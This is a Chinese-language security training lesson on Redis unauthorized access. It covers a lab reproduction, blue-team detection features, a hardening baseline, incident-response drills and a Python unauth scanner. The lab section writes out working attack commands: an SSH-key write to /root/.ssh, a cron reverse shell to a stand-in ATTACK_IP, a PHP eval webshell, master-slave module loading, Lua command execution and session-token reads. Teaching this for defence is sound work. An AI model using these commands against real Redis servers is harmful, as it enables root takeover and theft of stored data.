# Day 44: Redis未授权访问复现与检测

## 今日目标


1. 理解Redis未授权访问漏洞的原理与危害
2. 复现三种Redis未授权访问的攻击方式
3. 掌握Redis安全的蓝队检测与加固方法

> **漏洞概述**：Redis默认绑定0.0.0.0且无密码认证，如果暴露在公网上，
> 攻击者可以直接连接、读写数据、甚至写入SSH公钥或计划任务获取服务器控制权。

---

## 漏洞原理（通俗版）

Redis是一个高性能的内存数据库，常用来做缓存、消息队列等。
它的默认配置非常"大方"——监听所有IP、不需要密码。

这就好比你的房子没锁门（无密码），还敞着窗户（监听0.0.0.0），
路过的人（攻击者）可以直接走进来，拿走东西、放东西、甚至换掉你的门锁（写入SSH凭证）。

危害级别：Redis未授权访问 + root权限运行Redis = 攻击者直接获得服务器root权限。

## 漏洞复现

### 第一步：启动环境
```
cd vulhub/redis/4-unacc
docker-compose up -d
```

### 第二步：验证未授权访问
```
redis-cli -h 127.0.0.1
127.0.0.1:6379> INFO server
```
如果能直接连接并执行命令，说明存在未授权访问。

### 第三步：尝试攻击（三种方式）

**方式一：写入SSH公钥（获取SSH登录权限）**
```
# 在攻击机上生成密钥
ssh-keygen -t rsa

# 将公钥写入Redis
127.0.0.1:6379> CONFIG SET dir /root/.ssh/
127.0.0.1:6379> CONFIG SET dbfilename authorized_keys
127.0.0.1:6379> SET xxx "\n\n<你的SSH公钥内容>\n\n"
127.0.0.1:6379> SAVE
# 然后用私钥SSH登录目标服务器
```

**方式二：写入计划任务（反弹Shell）**
```
127.0.0.1:6379> CONFIG SET dir /var/spool/cron/
127.0.0.1:6379> CONFIG SET dbfilename root
127.0.0.1:6379> SET xxx "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/ATTACK_IP/PORT 0>&1\n\n"
127.0.0.1:6379> SAVE
# 等1分钟，攻击机会收到反弹Shell
```

**方式三：写入Webshell（如果Redis和Web部署同一台机器）**
```
127.0.0.1:6379> CONFIG SET dir /var/www/html/
127.0.0.1:6379> CONFIG SET dbfilename shell.php
127.0.0.1:6379> SET xxx "\n\n<?php @eval($_POST['cmd']);?>\n\n"
127.0.0.1:6379> SAVE
# 访问 http://target/shell.php 获取Webshell
```

## 蓝队检测特征

### 网络层检测
| 检测点 | 特征 | 说明 |
|:---|:---|:---|
| 端口 | 6379端口对外开放 | 默认应只监听127.0.0.1 |
| 协议 | Redis RESP协议 | 特征：*数字开头的命令 |
| 命令关键字 | CONFIG SET dir、CONFIG SET dbfilename、SAVE | 这些命令组合出现极可疑 |
| 写入路径 | /root/.ssh/、/var/spool/cron/ | 不正常的Redis数据路径 |

### 检测规则示例

```
IF:
  目标端口 == 6379
  AND 源IP不在内网白名单中
  AND 连接成功（无认证）
THEN:
  ALERT: Redis未授权访问
```

### 日志分析
Redis默认不记录请求日志（性能考虑），但可以在配置中开启：
```
CONFIG SET slowlog-log-slower-than 0  # 记录所有命令
```
蓝队建议：生产环境Redis开启审计日志，记录所有CONFIG SET操作。

## Redis安全速查表

### 蓝队排查Redis安全的5分钟清单

```
1. 检查Redis是否监听在外网IP：
   ss -tlnp | grep 6379
   如果看到 0.0.0.0:6379 或 :::6379 就是有风险

2. 检查Redis是否有密码：
   redis-cli INFO server | grep requirepass
   如果看到空密码就需要设置

3. 检查Redis是否以root运行：
   ps aux | grep redis
   如果USER是root需要改为redis用户

4. 检查危险命令是否禁用：
   在redis.conf中找 rename-command CONFIG ""

5. 检查是否开启保护模式：
   CONFIG GET protected-mode
   新版Redis默认开启，但老版本可能关闭
```

### 面试题：Redis怎么防？

1. 不要绑定 0.0.0.0（改bind配置）
2. 设置强密码（requirepass）
3. 前面放防火墙/安全组（限制来源IP）
4. 以非root用户运行（user redis）
5. 禁用或重命名危险命令（CONFIG、FLUSHALL等）
6. 定期检查Redis配置文件是否被篡改

### 真实案例

某公司把Redis部署在公网云服务器上，使用默认配置（无密码+绑定0.0.0.0）。
一天运维发现服务器CPU 100%，排查后发现：
1. 攻击者通过Redis未授权写入了SSH公钥
2. SSH登录后植入了挖矿木马
3. 木马运行了3天才被发现（因为Redis性能受影响才查到）

损失：服务器算力被偷了3天，可能还有数据泄露风险。
教训：Redis不能裸奔，密码是最低限度的安全措施。

## Redis安全深度剖析

### Redis为什么这么"危险"？

Redis的设计哲学是：**性能优先，安全其次**。这个设计在最初是合理的——
Redis预期运行在受信任的内网环境中，防火墙负责安全。

但现实是：大量Redis被直接部署在云服务器上，防火墙规则配置不当，导致公网可以直接访问。

### Redis未授权利用的更多方式

除了今天学的三种利用方式（SSH公钥、计划任务、Webshell），还有：

**方式四：主从复制RCE**
Redis 4.x/5.x 版本中，可以通过主从复制加载恶意模块执行命令。
```
SLAVEOF attacker_ip 6379  # 让目标Redis成为自己的从节点
# 上传恶意.so模块
MODULE LOAD /path/to/evil.so  # 加载恶意模块
```

**方式五：利用Lua脚本**
如果Redis允许运行Lua脚本，也可以用来执行系统命令：
```
EVAL "local f=io.popen('COMMAND');local s=f:read('*a');f:close();return s" 0
```

**方式六：数据窃取**
即使不能执行命令，攻击者也可以读取Redis中的敏感数据：
```
KEYS *   # 列出所有key
GET session:admin_token   # 获取session
GET cache:user_info   # 获取缓存数据
```
如果你的Redis中存储了session、token、缓存密码等，数据就已经泄露了。

### 蓝队检测：发现Redis未授权访问后怎么办？

发现公网可访问的Redis后的标准处置流程：

1. **确认危害程度**：
   - 检查Redis是否以root运行（ps aux | grep redis）
   - 检查是否有可疑的SSH key（cat /root/.ssh/authorized_keys）
   - 检查是否有异常的计划任务（crontab -l）

2. **紧急止血**：
   - 立即设置密码：CONFIG SET requirepass "temporary_password"
   - 或临时封禁端口：iptables -A INPUT -p tcp --dport 6379 -j DROP
   - 检查是否有已被植入的后门

3. **根本修复**：
   - bind 127.0.0.1
   - requirepass 设置强密码
   - 非root用户运行
   - 禁止外网访问6379端口

4. **横向排查**：
   - 同一网段是否还有其他Redis使用了默认配置？
   - 如果有SSH密钥被植入，哪些服务器使用了同样的密钥？

### 真实护网案例

某次护网中，红队通过资产测绘平台（如FOFA、Shodan）搜索到目标企业
多个Redis服务暴露在公网上且无密码。红队写入SSH公钥后直接获取了
3台服务器的root权限，进而横向移动控制了整个内网。

防守方的疏忽：
1. 资产台账中没有Redis
2. 防火墙规则过于宽松
3. Redis部署后没有做安全配置检查

血的教训：**你不知道的资产可能是最大的安全漏洞。**

## Redis安全配置速查卡

### Redis安全配置基线（生产环境最低要求）

```
# redis.conf 安全相关配置

# 1. 绑定内网地址
bind 127.0.0.1 10.0.0.1

# 2. 设置强密码（至少16位）
requirepass Your$trongP@ssword2026!

# 3. 修改默认端口
port 16379

# 4. 禁用/重命名危险命令
rename-command CONFIG "CONFIG_RENAMED_DO_NOT_USE"
rename-command FLUSHALL ""
rename-command FLUSHDB ""
rename-command DEBUG ""
rename-command SHUTDOWN ""

# 5. 开启保护模式（Redis 3.2+默认开启）
protected-mode yes

# 6. 非root运行
# 不要在root下启动redis-server
# 创建redis用户：useradd -r -s /bin/false redis
# 以redis用户运行：sudo -u redis redis-server /etc/redis/redis.conf
```

## 蓝队日常演练：模拟真实护网场景

### 场景一：凌晨3点收到Redis告警

**场景描述：**
你值夜班，凌晨3点监控平台弹出告警：一台服务器（10.0.1.50）的Redis端口（6379）
收到了来自境外IP（45.x.x.x）的连接请求，并且成功执行了 CONFIG SET 命令。

**你的处置流程：**

1. **第一反应（0-30秒）**：P0告警，立即确认
   - 打开ELK，搜索源IP 45.x.x.x 的所有日志
   - 发现该IP在过去10分钟内一直在对内网做端口扫描

2. **分析阶段（30秒-2分钟）**：
   - 查看Redis日志：发现执行了 CONFIG SET dir /root/.ssh/ 和 CONFIG SET dbfilename authorized_keys
   - 判断：攻击者正在尝试写入SSH公钥，获取服务器控制权！

3. **处置阶段（2-5分钟）**：
   - 立即在防火墙上封禁 45.x.x.x
   - SSH登录 10.0.1.50，检查 /root/.ssh/authorized_keys 是否有异常公钥
   - 给Redis设置临时密码：CONFIG SET requirepass "emergency_pass_2026"
   - 通知组长和运维

4. **善后阶段（5-30分钟）**：
   - 排查同一网段其他Redis是否也有类似配置问题
   - 检查是否有后续的SSH登录记录（如果有，说明已被入侵）
   - 写应急处置报告

**这个场景的启示：**
- Redis未授权访问不是"小问题"，它可以导致服务器被完全控制
- 凌晨的攻击需要特别重视，因为攻击者知道这个时候防守最薄弱
- 处置要快：从发现到封禁最好在5分钟内完成

### 场景二：办公网发现Weblogic扫描流量

**场景描述：**
IDS检测到某内网IP（192.168.1.100）在扫描多个服务器的7001端口，
并发送了带有 ProcessBuilder 关键字的SOAP请求。

**判断思路：**
内网IP发起Weblogic攻击 -> 两台可能：
1. 安全团队在做渗透测试（查一下有没有授权的测试计划）
2. 这台机器已经被黑客控制，正在内网横向移动

查询后发现当天没有测试计划 -> 选项2成立！

**处置流程：**
1. 立即断网这台机器（但不关机，保留内存证据）
2. 检查该机器的进程列表、网络连接、计划任务
3. 发现了一个可疑的进程：java -jar reverser_shell.jar
4. 追踪攻击入口：该机器上运行着一个未修复的Shiro应用

**教训：**
- 内网的异常扫描比外网扫描危险100倍，因为说明边界已被突破
- 不看来源IP的"态度"（内网=信任）是安全的大忌
- 一旦确认内网机器被控，必须立即隔离

### 坚持的秘诀

1. **不要完美主义**：今天状态不好？学15分钟也可以，不要"既然不能学1小时就不学了"
2. **建立仪式感**：每天固定时间学习（比如早上通勤时看30分钟）
3. **及时反馈**：每学完一个漏洞就奖励自己（一杯咖啡、一集电视剧）
4. **同伴激励**：找个同学一起学，互相打卡
5. **记录进步**：每周回头看看自己写的笔记，你会发现自己进步了

### 写给你自己

你现在学网络安全可能是因为：
- 想找一份安全相关的工作
- 想参加护网行动
- 单纯对黑客技术感兴趣
- 被要求学（公司安排）

不管什么原因，记住你的初始目标。当想放弃时，想想当初为什么开始。

> 一句话总结：网络安全没有"学完"的那一天，但每学一天，你就比昨天更强一点。这120天就是你的"第一桶知识"。

## Redis安全自动化检查脚本

```python
import socket

def check_redis_unauth(target, port=6379):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((target, port))
        s.send(b"INFO\r\n")
        data = s.recv(1024)
        s.close()
        if b"redis_version" in data:
            print(f"[+] {target}:{port} Redis未授权访问!")
            # 提取版本信息
            for line in data.decode().split('\r\n'):
                if 'redis_version' in line:
                    print(f"    {line}")
            return True
    except:
        pass
    return False

# 批量检查
targets = ["10.0.1.50", "10.0.1.51", "10.0.1.52"]
for t in targets:
    check_redis_unauth(t)
```

蓝队可以将此脚本加入日常安全巡检中，每周对内网所有Redis做一次未授权检查。
